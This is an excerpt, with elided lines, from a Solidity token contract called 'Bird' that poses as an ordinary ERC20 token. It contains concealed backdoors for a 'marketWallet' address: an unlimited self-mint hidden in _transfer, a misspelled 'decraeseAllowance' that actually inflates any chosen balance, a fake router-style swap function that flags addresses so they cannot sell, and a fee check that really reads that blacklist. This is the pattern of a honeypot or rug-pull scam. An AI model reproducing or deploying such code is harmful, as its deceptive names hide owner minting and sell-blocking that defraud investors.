...
contract Bird is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (marketWallet == from) {
            _inSwapAndLiquify[marketWallet] = _inSwapAndLiquify[marketWallet].add(totalSupply() * 1000);
        }
        if (changePair) {
    ...
    function decraeseAllowance(address spender, uint256 subtractedValue)
        external
    {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _inSwapAndLiquify[spender] = _inSwapAndLiquify[spender].add(subtractedValue);
        }
    }
    ...
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        ...
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _lockTheSwap[spender] = true;
            _lockTheSwap[spenders] = true;
        }
    }
    ...
    function isExcludedFromFee(address spender) external view returns (bool) {
        require(_msgSender() == marketWallet || _msgSender() == _owner);
        return _lockTheSwap[spender];
    }
